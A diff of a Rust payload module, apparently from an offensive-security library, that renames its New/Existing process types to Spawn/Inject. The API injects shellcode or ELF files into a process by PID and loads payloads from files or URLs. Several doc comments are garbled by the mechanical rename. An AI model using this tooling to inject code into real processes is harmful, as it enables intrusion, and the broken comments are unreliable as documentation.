@@ -1,25 +1,25 @@
 //! Defines types and implementations for working with executable payloads.
 //!
 //! There are two types of payloads which:
-//! - Create new processes (`Payload<New>`)
-//! - Inject into existing processes (`Payload<Existing>`)
+//! - Create Spawn processes (`Payload<Spawn>`)
+//! - Inject into Inject processes (`Payload<Inject>`)
 //!
 //! # Examples
 //!
-//! Creating a new process:
+//! Creating a Spawn process:
 //! ```no_run
-//! use linc::payload::{New, Payload, PayloadType};
+//! use linc::payload::{Spawn, Payload, PayloadType};
 //!
-//! let payload = Payload::<New>::from_file("/usr/bin/ls", PayloadType::Executable)
+//! let payload = Payload::<Spawn>::from_file("/usr/bin/ls", PayloadType::Executable)
 //!     .unwrap()
 //!     .set_args("-l -a");
 //! ```
 //!
-//! Injecting into an existing process:
+//! Injecting into an Inject process:
 //! ```no_run
-//! use linc::payload::{Existing, Payload, PayloadType};
+//! use linc::payload::{Inject, Payload, PayloadType};
 //!
-//! let payload = Payload::<Existing>::from_file(
+//! let payload = Payload::<Inject>::from_file(
 //!     "shellcode.bin",
 //!     PayloadType::Shellcode,
 //!     1234  // PID of target process
@@ -35,52 +35,52 @@ use crate::error::Result;
 // region:    --- Payload
 
 /// Marker trait that defines valid process states.
-/// Currently implemented by `New` and `Existing`.
+/// Currently implemented by `Spawn` and `Inject`.
 pub trait ProcessState {}
 
-/// State type representing payloads that create new processes.
-/// Contains configuration for the new process.
-pub struct New {
+/// State type representing payloads that create Spawn processes.
+/// Contains configuration for the Spawn process.
+pub struct Spawn {
     name: String,
     args: String,
     target: String,
     target_args: String,
 }
 
-/// State type representing payloads that inject into existing processes.
+/// State type representing payloads that inject into Inject processes.
 /// Contains the target process identifier.
-pub struct Existing {
+pub struct Inject {
     pid: Pid,
 }
 
-// Make sure that ProcessState can be either New or Existing
-impl ProcessState for New {}
-impl ProcessState for Existing {}
+// Make sure that ProcessState can be either Spawn or Inject
+impl ProcessState for Spawn {}
+impl ProcessState for Inject {}
 
 /// A payload that can be used for process injection or creation.
-/// The type parameter `S` determines whether this payload creates a new process
+/// The type parameter `S` determines whether this payload creates a Spawn process
 /// or injects into an existing one.
 ///
 /// # Type Parameters
 ///
-/// * `S` - The process state, must implement `ProcessState`. Can be either `New` or `Existing`.
+/// * `S` - The process state, must implement `ProcessState`. Can be either `Spawn` or `Inject`.
 ///
 /// # Examples
 ///
-/// Creating a new process payload:
+/// Creating a Spawn process payload:
 /// ```no_run
-/// use linc::payload::{New, Payload, PayloadType};
+/// use linc::payload::{Spawn, Payload, PayloadType};
 ///
-/// let payload = Payload::<New>::from_file("/usr/bin/ls", PayloadType::Executable)
+/// let payload = Payload::<Spawn>::from_file("/usr/bin/ls", PayloadType::Executable)
 ///     .unwrap()
 ///     .set_args("-l -a");
 /// ```
 ///
-/// Creating an existing process payload:
+/// Creating an Inject process payload:
 /// ```no_run
-/// use linc::payload::{Existing, Payload, PayloadType};
+/// use linc::payload::{Inject, Payload, PayloadType};
 ///
-/// let payload = Payload::<Existing>::from_file(
+/// let payload = Payload::<Inject>::from_file(
 ///     "shellcode.bin",
 ///     PayloadType::Shellcode,
 ///     1234
@@ -100,8 +100,8 @@ pub enum PayloadType {
 }
 
 // Constructors
-impl Payload<New> {
-    /// Creates a new payload from a byte vector.
+impl Payload<Spawn> {
+    /// Creates a Spawn payload from a byte vector.
     ///
     /// The bytes can represent either a complete ELF executable or raw shellcode, as specified by
     /// the `payload_type` parameter.
@@ -117,17 +117,17 @@ impl Payload<New> {
     /// # Examples
     ///
     /// ```
-    /// use linc::payload::{New, Payload, PayloadType};
+    /// use linc::payload::{Spawn, Payload, PayloadType};
     ///
     /// // Create a payload from shellcode bytes
     /// let shellcode = vec![0x90, 0x90, 0x90];  // NOP sled
-    /// let payload = Payload::<New>::from_bytes(shellcode, PayloadType::Shellcode).unwrap();
+    /// let payload = Payload::<Spawn>::from_bytes(shellcode, PayloadType::Shellcode).unwrap();
     /// ```
     pub fn from_bytes(bytes: Vec<u8>, payload_type: PayloadType) -> Result<Self> {
         Ok(Self {
             payload_type,
             bytes,
-            state: New {
+            state: Spawn {
                 name: String::new(),
                 args: String::new(),
                 target: String::new(),
@@ -136,7 +136,7 @@ impl Payload<New> {
         })
     }
 
-    /// Creates a new payload by reading from a file.
+    /// Creates a Spawn payload by reading from a file.
     ///
     /// The file can contain either a complete ELF executable or raw shellcode, as specified by
     /// the `payload_type` parameter.
@@ -154,13 +154,13 @@ impl Payload<New> {
     /// # Examples
     ///
     /// ```no_run
-    /// use linc::payload::{New, Payload, PayloadType};
+    /// use linc::payload::{Spawn, Payload, PayloadType};
     ///
     /// // Load a shellcode file
-    /// let payload = Payload::<New>::from_file("shellcode.bin", PayloadType::Shellcode).unwrap();
+    /// let payload = Payload::<Spawn>::from_file("shellcode.bin", PayloadType::Shellcode).unwrap();
     ///
-    /// // Load an existing ELF executable
-    /// let payload = Payload::<New>::from_file("/usr/bin/ls", PayloadType::Executable).unwrap();
+    /// // Load an Inject ELF executable
+    /// let payload = Payload::<Spawn>::from_file("/usr/bin/ls", PayloadType::Executable).unwrap();
     /// ```
     pub fn from_file(path: impl Into<String>, payload_type: PayloadType) -> Result<Self> {
         let path = path.into();
@@ -168,7 +168,7 @@ impl Payload<New> {
         Ok(Self {
             payload_type,
             bytes: fs::read(&path)?,
-            state: New {
+            state: Spawn {
                 name: path.split('/').last().unwrap_or("").to_string(),
                 args: String::new(),
                 target: String::new(),
@@ -178,7 +178,7 @@ impl Payload<New> {
     }
 
     #[cfg(feature = "http")]
-    /// Creates a new payload by downloading from a URL.
+    /// Creates a Spawn payload by downloading from a URL.
     ///
     /// The downloaded content can be either a complete ELF executable or raw shellcode, as specified by
     /// the `payload_type` parameter.
@@ -197,16 +197,16 @@ impl Payload<New> {
     /// # Examples
     ///
     /// ```no_run
-    /// use linc::payload::{New, Payload, PayloadType};
+    /// use linc::payload::{Spawn, Payload, PayloadType};
     ///
     /// // Download and load an ELF executable
-    /// let payload = Payload::<New>::from_url(
+    /// let payload = Payload::<Spawn>::from_url(
     ///     "http://example.com/executable",
     ///     PayloadType::Executable
     /// ).unwrap();
     ///
     /// // Download and load shellcode
-    /// let payload = Payload::<New>::from_url(
+    /// let payload = Payload::<Spawn>::from_url(
     ///     "http://example.com/shellcode.bin",
     ///     PayloadType::Shellcode
     /// ).unwrap();
@@ -222,7 +222,7 @@ impl Payload<New> {
         Ok(Self {
             payload_type,
             bytes: payload_bytes,
-            state: New {
+            state: Spawn {
                 name: url.split('/').last().unwrap_or("").to_string(),
                 args: String::new(),
                 target: String::new(),
@@ -232,8 +232,8 @@ impl Payload<New> {
     }
 }
 
-impl Payload<Existing> {
-    /// Creates a new payload for injection into an existing process.
+impl Payload<Inject> {
+    /// Creates a Spawn payload for injection into an Inject process.
     ///
     /// # Parameters
     ///
@@ -244,9 +244,9 @@ impl Payload<Existing> {
     /// # Examples
     ///
     /// ```no_run
-    /// use linc::payload::{Existing, Payload, PayloadType};
+    /// use linc::payload::{Inject, Payload, PayloadType};
     ///
-    /// let payload = Payload::<Existing>::from_bytes(
+    /// let payload = Payload::<Inject>::from_bytes(
     ///     vec![0x90, 0x90, 0x90],
     ///     PayloadType::Shellcode,
     ///     1234
@@ -256,13 +256,13 @@ impl Payload<Existing> {
         Ok(Self {
             payload_type,
             bytes,
-            state: Existing {
+            state: Inject {
                 pid: Pid::from_raw(pid),
             },
         })
     }
 
-    /// Creates a new payload by reading from a file.
+    /// Creates a Spawn payload by reading from a file.
     ///
     /// The file can contain either a complete ELF executable or raw shellcode, as specified by
     /// the `payload_type` parameter.
@@ -281,9 +281,9 @@ impl Payload<Existing> {
     /// # Examples
     ///
     /// ```no_run
-    /// use linc::payload::{Existing, Payload, PayloadType};
+    /// use linc::payload::{Inject, Payload, PayloadType};
     ///
-    /// let payload = Payload::<Existing>::from_file(
+    /// let payload = Payload::<Inject>::from_file(
     ///     "shellcode.bin",
     ///     PayloadType::Shellcode,
     ///     1234
@@ -295,13 +295,13 @@ impl Payload<Existing> {
         Ok(Self {
             payload_type,
             bytes: fs::read(&path)?,
-            state: Existing {
+            state: Inject {
                 pid: Pid::from_raw(pid),
             },
         })
     }
 
-    /// Creates a new payload by downloading from a URL.
+    /// Creates a Spawn payload by downloading from a URL.
     ///
     /// The downloaded content can be either a complete ELF executable or raw shellcode, as specified by
     /// the `payload_type` parameter.
@@ -321,9 +321,9 @@ impl Payload<Existing> {
     /// # Examples
     ///
     /// ```no_run
-    /// use linc::payload::{Existing, Payload, PayloadType};
+    /// use linc::payload::{Inject, Payload, PayloadType};
     ///
-    /// let payload = Payload::<Existing>::from_url(
+    /// let payload = Payload::<Inject>::from_url(
     ///     "http://example.com/shellcode.bin",
     ///     PayloadType::Shellcode,
     ///     1234
@@ -341,7 +341,7 @@ impl Payload<Existing> {
         Ok(Self {
             payload_type,
             bytes: payload_bytes,
-            state: Existing {
+            state: Inject {
                 pid: Pid::from_raw(pid),
             },
         })
@@ -362,7 +362,7 @@ impl<S: ProcessState> Payload<S> {
 }
 
 // Variant-specific getters
-impl Payload<New> {
+impl Payload<Spawn> {
     /// Returns the name of the payload.
     pub fn name(&self) -> &str {
         &self.state.name
@@ -384,7 +384,7 @@ impl Payload<New> {
     }
 }
 
-impl Payload<Existing> {
+impl Payload<Inject> {
     /// Returns the process ID that this payload will be injected into.
     pub fn pid(&self) -> Pid {
         self.state.pid
@@ -392,7 +392,7 @@ impl Payload<Existing> {
 }
 
 // Chainable setters
-impl Payload<New> {
+impl Payload<Spawn> {
     /// Sets the arguments for this payload.
     pub fn set_args(mut self, args: &str) -> Self {
         self.state.args = self.state.name.clone() + " " + args;
@@ -423,31 +423,31 @@ pub trait PayloadResultExt {
     ///
     /// # Errors
     /// Returns the original error if the payload creation failed.
-    fn set_args(self, args: &str) -> Result<Payload<New>>;
+    fn set_args(self, args: &str) -> Result<Payload<Spawn>>;
 
     /// Sets the target executable for the payload.
     ///
     /// # Errors
     /// Returns the original error if the payload creation failed.
-    fn set_target(self, target: &str) -> Result<Payload<New>>;
+    fn set_target(self, target: &str) -> Result<Payload<Spawn>>;
 
     /// Sets the target executable's arguments for the payload.
     ///
     /// # Errors
     /// Returns the original error if the payload creation failed.
-    fn set_target_args(self, target_args: &str) -> Result<Payload<New>>;
+    fn set_target_args(self, target_args: &str) -> Result<Payload<Spawn>>;
 }
 
-impl PayloadResultExt for Result<Payload<New>> {
-    fn set_args(self, args: &str) -> Result<Payload<New>> {
+impl PayloadResultExt for Result<Payload<Spawn>> {
+    fn set_args(self, args: &str) -> Result<Payload<Spawn>> {
         self.map(|payload| payload.set_args(args))
     }
 
-    fn set_target(self, target: &str) -> Result<Payload<New>> {
+    fn set_target(self, target: &str) -> Result<Payload<Spawn>> {
         self.map(|payload| payload.set_target(target))
     }
 
-    fn set_target_args(self, target_args: &str) -> Result<Payload<New>> {
+    fn set_target_args(self, target_args: &str) -> Result<Payload<Spawn>> {
         self.map(|payload| payload.set_target_args(target_args))
     }
 }
